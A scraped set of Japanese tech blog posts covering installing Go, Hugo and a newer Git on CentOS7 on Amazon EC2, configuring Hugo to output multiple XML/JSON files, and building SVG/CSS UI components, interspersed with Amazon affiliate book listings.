システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-27T15:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-27-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-27-01-ani/","title":"第1回 pythonでNQueen（エイトクイーン）ブルートフォース　力任せ探索（１）"},{"content":"HugoをGitHub Pagesで展開していたのですが、今回はGitHub Pagesではなく、Amazon EC2にHugoをインストールしてみたいと思います。\nGO言語をCentOS7にインストール Hugoを利用するためにGo言語をインストールするのですが、yumでインストールすると様々ななエラーが出る場合があるので、今回はtarファイルを解凍して配置します。\nbrewがすでにインストールされている場合はbrewでのインストールが早いです。\nGO言語をインストール まずは、GO言語のファイルをダウンロードして、解凍、インストールする場所に配置してやりましょう。\n$ wget https://golang.org/dl/go1.16.linux-amd64.tar.gz $ sudo tar zxf go1.16.linux-amd64.tar.gz -C /usr/local/ $ export PATH=$PATH:/usr/local/go/bin インストールされたGoのバージョンを確認します\n$ go version インストールが成功していれば、下記のようなバージョンが表示されます。\ngo version go1.15.14 linux/amd64 GOROOTも確認しておきます\n$ go env|grep GOROOT GOROOT=\u0026#34;/usr/local/go\u0026#34; Hugoをインストールする上で、GOPATHが必要なので設定しましょう。\nGOPATHとGOROOTが同じ場所にならないようにすることに注意してください。\n同じ場所に設定してしまうと、\nwarning: GOPATH set to GOROOT (/usr/local/go) has no effect といったワーニングが表示されてしまいます。\nなので、GOPATHとGOROOTを別にしてやりましょう。\nそれではGOPATHを設定していきます。\nvi ~/.bash_profile 上記のコマンドで、.bash_profileをひらいて、下記のコマンドを追加します。\nexport GOPATH=$HOME/go export PATH=$GOPATH/bin:$PATH:$HOME/bin 設定を反映させて、確認します。\n$ source ~/.bash_profile $ echo $GOPATH /home/[user]/go $ echo $PATH /home/[user]/go/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/bin:/root/bin:/root/bin 無事追加できました。\n以上がGo言語の設定になります。\nHugoをCentOS7にインストール それでは、いよいよHugoをインストールしましょう。\nGitHubからHugoを取得します。\nmkdir $HOME/src cd $HOME/src git clone https://github.com/gohugoio/hugo.git cd hugo go install --tags extended インストールできたら hugo してみましょう\nGitInfoを使っているとエラーになる場合がある Gitのバージョンが古いと、hugoした際に、情報を取得できないくてエラーになってしまうようです。\nhugo v0.93.0-DEV+extended linux/amd64 BuildDate=unknown ERROR 2022/01/27 Failed to read Git log: Unknown option: -C usage: git [--version] [--help] [-c name=value] [--exec-path[=\u0026lt;path\u0026gt;]] [--html-path] [--man-path] [--info-path] [-p|--paginate|--no-pager] [--no-replace-objects] [--bare] [--git-dir=\u0026lt;path\u0026gt;] [--work-tree=\u0026lt;path\u0026gt;] [--namespace=\u0026lt;name\u0026gt;] \u0026lt;command\u0026gt; [\u0026lt;args\u0026gt;] 私の環境ではGitのバージョンがgit version 1.8.3.1 となっていたため、これをアップデートして正しく動作するようにします。\nまずはすでにインストールされているGitを削除します。\n$ sudo yum -y remove git 次に、2系の配布がされているiusリポジトリを追加します。\n私の環境はCentOS7だったので下記のコマンドでyumからインストールします。\n$ sudo yum -y install https://repo.ius.io/ius-release-el7.rpm iusはサードパーティのリポジトリのため、常に有効にならないように設定ファイルを確認しておきます。enabled = 0 となっていたら、常に有効にならない設定です。\n[ius-debuginfo] name = IUS for Enterprise Linux 7 - $basearch - Debug baseurl = https://repo.ius.io/7/$basearch/debug/ enabled = 0 repo_gpgcheck = 0 gpgcheck = 1 gpgkey = file:///etc/pki/rpm-gpg/RPM-GPG-KEY-IUS-7 [ius-source] name = IUS for Enterprise Linux 7 - Source baseurl = https://repo.ius.io/7/src/ enabled = 0 repo_gpgcheck = 0 gpgcheck = 1 gpgkey = file:///etc/pki/rpm-gpg/RPM-GPG-KEY-IUS-7 それでは。インストール可能なGitを調べます。\nyumでiusを使うときは、yumコマンドの際に、--enablerepo=iusオプションをつけます。\n$ sudo yum list --enablerepo=ius | grep git2 … git224.x86_64 2.24.4-1.el7.ius ius … インストール可能なGitがあったので、インストールをします。\n$ sudo yum -y install --enablerepo=ius git224 インストールが無事完了したことを確認しましょう\n$ git --version git version 2.24.3 バージョンが表示されていたら、正常にインストールが完了してます。\nこれで GitInfo 使ったhugoのサーバでもhugoコマンドが実行できるようになりました。\nおすすめの書籍 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。 本書ではクリック操作でGitを使えるSourceTreeを中心に解説しているので、初心者でも安心です。 せっかく学ぶなら、やっぱり楽しい方がいい 「Gitって難しそう」 「勉強しようとは思っているけど、なかなか一歩が踏み出せない」 そんな方のために、楽しくGitを理解できる本を作りました。 ・個性的なキャラクターたちが登場するマンガ ・感覚的にわかる図解 ・丁寧な実践パート 上記3つの特長で、Gitを無理なく学べます。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) 【プレーンテキストでらくらくライティング! Markdownを使いこなそう! 】 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 〈本書の対象読者〉 執筆のストレスを減らして集中したい人 PCが古くて軽いアプリで執筆したい人 いろいろなアプリで原稿を使いまわしたい人 思いついた時にスマホでメモ書きして原稿にまとめたい人 続きを読む 。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-27T13:31:52+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-27-01-wyoshi/catch_huc49a39ca3161145aca5fe042a7423360_209786_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-27-01-wyoshi/","title":"Amazon EC2でもGo言語とHugoを使えるようにする方法"},{"content":"HUGOは非常に強力な静的HTMLジェネレーターです。\n複数のXMLを設置する機会があり、どうやったら設置できるのかなと悪戦苦闘しながら実装できましたので、そのやり方を共有します。\n今回は sitemap.xml を複数設置する必要があったため、その方法になります。\nこの方法の出力やファイル形式を変えることで、RSSやJSON、AMPなどの形式も出力できるようになると思います。\nconfig に設定を追加する まずは config.yaml に出力用の設定をします。\n設定の内容は下記のようになります。\n私は yaml 形式の設定ファイルを使っているのですが、toml や json 形式の設定ファイルを使っている方は、 HUGO のページを見ながらそれぞれにあった記述にしてください。\nmediaTypes: application/xml: suffixes: xml outputFormats: Sitemap: MediaType: application/xml baseName: \u0026#34;google_sitemap\u0026#34; noUgly: true outputs: home: [HTML, Sitemap, RSS] 上から順に説明します。\n出力ファイルの形式 mediaTypes: application/xml: suffixes: xml ここでは出力したい形式を選択してます。今回は、xmlのタイプを選んでます。\nちなみに、この部分は記述しないでも問題がない部分です。\n私の環境では出力した場合に、エラーにならずに正常にファイルが出力されました。\nsuffixesの部分では複数の形式を記述することが可能です。\n例えば、rss+xmlの場合は\nmediaTypes: application/rss+xml: suffixes: - xml - rss となります。\n出力ファイルの種類 次に、outputFormats部分ですが、この部分が出力の際に重要になってきます。\n今回はサイトマップ形式で出力するので、下記のようにしました。\noutputFormats: Sitemap: MediaType: application/xml baseName: \u0026#34;google_sitemap\u0026#34; noUgly: true 上の yaml を説明すると、\nSitemap 形式で MediaTypeはサイトマップを表すapplication/xmlを使用して、google_sitemapというファイル名のXMLを出力します。\n出力の形式 出力形式のオプションは以下のようになります。\n1つのページに多くの出力形式で出力可能 1つのページを好きなだけ多くの出力形式で出力することができ、ファイルシステム上の一意なパスに解決する限り、無限に出力形式を定義することができるのです。\n表では、AMPとHTMLの比較が最も良い例です。AMPはHTML版を上書きしないようにPathにampという値を持っています。\n例えば、/index.htmlと/amp/index.htmlの両方を持つことができるようになりました。 MediaTypeはは既存のもののみ MediaTypeは、既に定義されているメディアタイプのTypeと一致する必要があります。 再定義可能 新しい出力形式を定義したり、組み込みの出力形式を再定義することができます。\n例えば、AMPページを別のパスに配置したい場合などです。 出力フォーマットを追加または変更するには、サイトの設定ファイルのoutputFormatsセクションで、すべてのサイトまたは特定の言語について定義します。\nname mediaType path baseName rel protocol isPlainText isHTML noUgly permalinkable HTML text/html index canonical false true false true AMP text/html amp index amphtml false true false true CSS text/css styles stylesheet true false false false CSV text/csv index alternate true false false false Calendar text/calendar index alternate webcal:// true false false false JSON application/json index alternate true false false false ROBOTS text/plain robots alternate true false false false RSS application/rss+xml index alternate false false true false Sitemap application/xml sitemap sitemap false false true false WebAppManifest application/manifest+json manifest manifest true false false false 出力形式を設定する 以下は、出力形式に関する設定オプションの全リストとそのデフォルト値になります。\nname 出力形式の識別子です。これは、ページに必要な出力形式を定義するために使用されます。 mediaType 定義されたメディアタイプのTypeと一致しなければなりません。 path 出力ファイルを保存するサブパス。 baseName ファイル名です。デフォルトはindex。 rel リンクタグのrel値を作成するために使用します。デフォルトはalternate。 protocol この出力形式に対して、baseURL の \u0026ldquo;http://\u0026rdquo; または \u0026ldquo;https://\u0026rdquo; を置き換えます。 isPlainText テンプレートにGoのプレーンテキストテンプレートパーサーを使用します。デフォルト: false。 isHTML HTMLタイプのフォーマットにのみ関連する状況で使用されます; 例えば、ページのエイリアスなどです。 noUgly uglyURLs がサイト内で true に設定されている場合、醜い URL をオフにするために使用されます。デフォルト：false notAlternative このフォーマットをPageのAlternativeOutputFormatsフォーマットのリストに含めることが意味をなさない場合（例えば、CSSなど）有効にします。\n注意点として、必ずしも他のフォーマットを置き換えるわけではないので、ここではalternateではなくalternativeという用語を使っています。デフォルト：false permalinkable .Permalink と .RelPermalink が main ではなくレンダリング出力形式を返すようにしました。これは、HTMLとAMPでデフォルトで有効になっています。デフォルト：false weight 0 以外の値を設定すると、最初のソート条件として使用されます。 出力するページを選択 最後に出力するページに関してです。\noutputs: home: [HTML, Sitemap, RSS] この部分はどのページで出力するかを選択できます。\n今回はサイトマップを作成したいので、ドキュメントルートに当たる home (/index.html) 部分でのみの出力としてます。\nHTML形式と、Sitemap、RSSを出力するようにしてます。HTMLでは index.html を出力し、RSSでは index.xml のRSS形式のフィードを出力してます。そして、今回追加したSitemapでサイトマップ形式のファイルを出力するようにしました。\n各ページの初期状態での出力は下記を参考にしてください。\npage HTML home HTML, RSS section HTML, RSS taxonomy HTML, RSS term HTML, RSS テンプレートファイルを追加する 設定が終わったので、次はテンプレートファイルを設置します。\nサイトマップ用のテンプレートを作成して、layouts/_defaultディレクトリに配置します。\nここが一番のポイントで、配置する際のファイル名は [page].[outputFormatsの名前].[suffixe] となります。\nつまり、今回でいうと home.sitemap.xml となります。\nただし、pageの場合は下記のようにmarkdownに埋め込んで出力します。\n--- title: \u0026#34;Search\u0026#34; layout: \u0026#34;search\u0026#34; outputs: - html - json --- これによって、layouts/page/search.html と layouts/page/search.json ファイルを使用して出力ファイルを作成します。\nおすすめの書籍 Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) 【プレーンテキストでらくらくライティング! Markdownを使いこなそう! 】 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 〈本書の対象読者〉 執筆のストレスを減らして集中したい人 PCが古くて軽いアプリで執筆したい人 いろいろなアプリで原稿を使いまわしたい人 思いついた時にスマホでメモ書きして原稿にまとめたい人 続きを読む 。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-26T14:37:51+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-26-01-wyoshi/catch_hud5f0ce966674d6b97fd2cc6aa77b573d_63288_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-26-01-wyoshi/","title":"HUGOでxmlやjsonファイルを複数出力する方法を詳しく解説"},{"content":"出典元： Building UI Components With SVG and CSS - Ahmad Shadeed SVGはアイコンやイラストだけでなく、開発者が時々忘れてしまう隠れた力をたくさん持っています。\nCSSと比較してSVGを使用することが非常に理にかなっているユースケースはたくさんあります。たとえば、円形の読み込みアニメーションを作成したり、画像にマスクを適用したりします。このような場合、CSSを使用できないという意味ではありませんが、使用する手法（マスクなど）に基づいてクロスブラウザの問題と戦うのは難しい場合があるため、SVGを使用すると時間と労力を節約できます。\nSVGの優れている点は、応答性、パフォーマンス、およびHTML＆CSSを使用してすぐに使用できることです。この記事では、SVGをHTMLおよびCSSとともに使用して特定のUIコンポーネントを構築できるさまざまなユースケースを紹介することを目標としています。\nそれでは、ユースケースを見てみましょう。\nカットアウトアバター 切り抜かれたアバターは、FacebookのCSSを調べているときに見つけたものです。\nメッセンジャーでは、ユーザーアバターにバッジを付けることができ、バッジ用のスペースを割り当てるためにアバターが切り取られます。\nこれは、CSSの白い境界線を追加することで実行できます（簡単な修正として）が、さらに動的SVGコンポーネントに取り入れてみましょう。\n.badge { border: 2px solid #ff; } borderが機能する場合、なぜSVGを使用するのか考えているかもしれませんが、間違いではありません。\nしかし、他よりも優れた解決策があります。数学の授業で、教師が問題にさまざまな解決策がある可能性があり、そのうちの1つが柔軟性の点で優れている可能性があると述べたことを覚えていますか？今回の問題もそれと同じです。\nとにかく、border の解決策がどのようにすぐに失敗するかを示してみましょう。\n失敗例\nホバー時：カードの背景が変わるため、白い境界線が奇妙に見えます。 ダークモード：白い境界線は黒っぽい背景の上になります 次の図では、バッジの白い境界線が暗い背景とホバー状態にどのように干渉しているかに注目してください。\nホバー時に境界線colorを変更することでそれを解決できますが、それは最善の解決策とは思えません。\n.card__badge { border: 2px solid #ff; } .card:hover .card__badge { border-color: lightgrey; } @media (prefers-color-scheme: dark) { .card__badge { border-color: #454545; } } SVGを使用すると、バッジの下の領域をカットすることで、上記の問題をより適切に解決できます。そうすれば、あらゆる種類のバックグラウンドで機能します。\n次の図を見てください。\nアバターを含めるためにSVG \u0026lt;image\u0026gt;要素を使用しています。バッジ領域を切り取るには、2つの\u0026lt;circle\u0026gt;要素を作成する必要があります。1つは白で、もう1つは黒です。\nマスクでは、黒で塗りつぶされた要素はすべて非表示になります、白の要素は表示されます。黒い円は、半径18の右下隅に配置されています。\n開発者ツールでは、上記は減算と呼ばれます。大きい円から小さい円を引きます。\nこれが最後のデモです\nタイトルの装飾 あるクライアントのプロジェクトで、SVGとCSSを組み合わせてセクションタイトルをデザイン・構築したことがあります。\nセキュリティに関連するブランドなので、このようなスタイルを使うことがあるかもしれません。\nコンポーネントは短いタイトルと長いタイトルで動作する必要があり、タイトルが長すぎる場合は、レイアウトを壊さずに複数の行に折り返す必要があります。\nそれを構築するためには、以下のような対応が必要です。\n最初に、固定部分（右側）をコピーして、インラインSVGとして追加する。 CSSを使用して、タイトルの下に行を作成しました。また、行の最初と最後にある小さな円にも使用。 不要なポジショニングを使用しないように、flexboxを使用してコンポーネントレイアウトを作成。 それでは基本的なHTMLとCSSから始めましょう。\n\u0026lt;h2 class=\u0026#34;c-section__title\u0026#34;\u0026gt; \u0026lt;span\u0026gt;CSS is awesome\u0026lt;/span\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; width=\u0026#34;128\u0026#34; height=\u0026#34;34.5\u0026#34; viewBox=\u0026#34;0 0 128 34.5\u0026#34; preserveAspectRatio=\u0026#34;none\u0026#34;\u0026gt; \u0026lt;path fill=\u0026#34;none\u0026#34; stroke=\u0026#34;#d8d8d8\u0026#34; stroke-width=\u0026#34;2\u0026#34; d=\u0026#34;M127 1H33.5L1 33.5\u0026#34;\u0026gt;\u0026lt;/path\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/h2\u0026gt; .c-section__title { max-width: 700px; width: fit-content; display: flex; margin-left: auto; margin-right: auto; } 次のステップでは、span 要素の下にボーダーを追加して、SVGに接続された線を追加したいと思います。\nSVGが回線に接続されていないことに気づきました。\nflexboxを使用しているので、修正するのは簡単です。flex-item をflex-endに揃える必要があります。\n.c-section__title { max-width: 700px; width: fit-content; display: flex; align-items: flex-end; margin-left: auto; margin-right: auto; } 次に、絶対位置指定で擬似要素を使って、最初と最後に円を追加する必要があります。\nまた、SVGを使うと何がいいかというと、SVGのパスを点線にして、アニメーションさせることができるのです。\nそのためには、SVGで書き出されたパスがアウトライン化されていないことを確認する必要があります。\n\u0026lt;path d=\u0026#34;M127 1H33.5L1 33.5\u0026#34; fill=\u0026#34;none\u0026#34; stroke=\u0026#34;#d8d8d8\u0026#34; stroke-width=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;/path\u0026gt; このテクニックは、Jake Archibald氏の素晴らしい記事 から学びました。このアイデアは、パスの長さを求めるというものです。\nChrome DevToolsで、SVGを検査し、\u0026lt;path\u0026gt;要素を選択すると、その末尾の横に== $0と表示されることがわかります。これを選択したまま、コンソールに移動し、以下のスクリプトを記述します。\n$0.getTotalLength() // 139.46 このようなことをしなくても、DOMから要素を選択するには、$0が手っ取り早いです。\nlet sectionPath = document.querySelector(\u0026#39;#path\u0026#39;); console.log(sectionPath.getTotalLength()); それはこの例の文脈の中での簡単なヒントでした。\nさて、長さが決まったら、あとは好きなようにやってみましょう。例えば、ホバー時にアニメーションさせることができます。\n.c-section__title--dashed path { stroke-dasharray: 139; stroke-dashoffset: 0; transition: 0.7s; } .c-section__title--dashed:hover path { stroke-dashoffset: 139; } または、単純に点線に変えることもできます（この場合、パスの長さを知る必要はありません）。\nSVGを使ったカスタムリンクの下線 SVGを使って、ワクワクするようなカスタムリンクのアンダーラインを作成することができます。私は数年前に、ランダムにパスを生成し、ホバー時にそれを再描画するスクリプトを作成しました。\n次の図で、プレビューの前と後を考えてみてください。\nアイデアは、各リンクにSVGを挿入することであり、次のようになります。\n\u0026lt;svg width=\u0026#34;400\u0026#34; height=\u0026#34;35\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;path id=\u0026#34;pathItem\u0026#34; d=\u0026#34;M5 5 Q 30 15 170 5\u0026#34; stroke=\u0026#34;black\u0026#34; fill=\u0026#34;transparent\u0026#34; stroke-width=\u0026#34;7\u0026#34; stroke-linecap=\u0026#34;round\u0026#34;/\u0026gt; \u0026lt;/svg\u0026gt; この手法は d 属性値を変更することによって起こります。これは、パスが実際にどのように描画されるかを示すビジュアルです。\nカスタムSVGテープ クライアントのプロジェクトに携わっているとき、CSSでどこにでも配置可能で、1つのCSS変数のみで色を変更できるほどダイナミックな方法で、テープをセクションに取り付ける方法が必要でした。\n次の図を考えて見ましょう。\nAdobe Illustratorで、テープをレイヤーに分割しました。\nベース：塗りつぶしの色を取ります 透明な黒：暗い領域を示します 透明な白：明るい領域を示します SVGコードを見てみましょう。\n\u0026lt;svg\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;g id=\u0026#34;tape\u0026#34; fill=\u0026#34;currentColor\u0026#34;\u0026gt; \u0026lt;!-- path contents --\u0026gt; \u0026lt;/g\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; fill=currentColorを追加したことに注意してください。\ncurrentColorキーワードは、CSS color 